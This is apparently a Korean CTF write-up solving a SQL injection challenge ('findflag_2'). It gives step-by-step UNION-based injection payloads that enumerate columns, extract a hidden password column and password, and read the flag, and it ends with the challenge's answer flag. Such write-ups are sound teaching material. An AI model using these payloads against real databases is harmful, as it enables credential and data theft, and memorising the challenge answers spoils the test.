## UNION을 적극 활용하여 풀어야 하는 문제

```
SELECT * FROM findflag_2
WHERE $id_column='{$id}'
AND $pw_column='{$pw}';
```

<br>

1. ORDER BY column number의 숫자를 늘려가며 column의 개수를 파악한다

`/?id=' OR 1 ORDER BY 5-- -`

```
SELECT * FROM findflag_2
WHERE $id_column='' OR 1
ORDER BY 5
-- -' AND $pw_column='';
```

column이 5개인 것과 id = adm1ngnngn임을 알 수 있다.

<br>

2. 몇 번째 column이 id인지 파악한다.

`/?id=' AND 0 UNION SELECT 1,2,3,4,5-- -`

```
SELECT * FROM findflag_2
WHERE $id_column='' AND 0
UNION SELECT 1,2,3,4,5
-- -' AND $pw_column='';
```

2번째 column이 id인 것을 알 수 있다.

<br>

3. $pw_column을 알아낸다.

`/?id=' AND UNION SELECT 1,&pw=,3,4,5-- -`

```
SELECT * FROM findflag_2
WHERE $id_column='' AND 0
UNION SELECT 1,' AND $pw_column=',3,4,5
-- -';
```

$pw_column = xPw4coaa1sslfe 임을 알 수 있다.

<br>

4. pw를 알아낸다.

`/?id=' AND 0 UNION SELECT 1,(SELECT xPw4coaa1sslfe FROM findflag_2),3,4,5-- -`

```
SELECT * FROM findflag_2
WHERE $id_column='' AND 0
UNION SELECT 1,(
    SELECT xPw4coaa1sslfe FROM findflag_2
    ),3,4,5
-- -' AND $pw_column='';
```

pw = !@SA#$! 임을 알 수 있다.

<br>

5. pw를 urlencode하여 넣어보고 확인한다.

`/?id=adm1ngnngn&pw=!%40SA%23%24!`

```
SELECT * FROM findflag_2
WHERE $id_column='adm1ngnngn'
AND $pw_column='!@SA#$!';
```

잘 동작하는 것을 확인할 수 있다.

<br>

6. flag를 알아낸다.
   `/?id=' AND 0 UNION SELECT 1,flag,3,4,5 FROM (SELECT 1,2,3,4 AS flag,5 UNION SELECT * FROM findflag_2 LIMIT 1,1) x-- -`

```
SELECT * FROM findflag_2
WHERE $id_column='' AND 0
UNION SELECT 1,flag,3,4,5 FROM (
    SELECT 1,2,3,4 AS flag,5
    UNION SELECT * FROM findflag_2
    LIMIT 1,1
    ) x
-- -' AND $pw_column='';
```

AS flag를 옮겨가며 확인해보면

idx_column, id_column, pw_column, flag_column, count_column 순으로 되어 있는 것을 알 수 있다.

<br>

7. id, pw, flag를 전부 입력하여 진짜 flag를 얻는다.

`/?id=adm1ngnngn&pw=!%40SA%23%24!&flag=N4wxpthJf7GmHXQ9oBZTvCdu5e3DnIUVl2biLsKgEYMrO8j0RFWaPSkcAy16zq`

```
SELECT * FROM findflag_2
WHERE $id_column='adm1ngnngn'
AND $pw_column='!@SA#$!'
```

good job!!<br />
FLAG : <b>DH{df01b8a9032dc88f7778ad58890fe0e5186170bc}</b>

<hr>
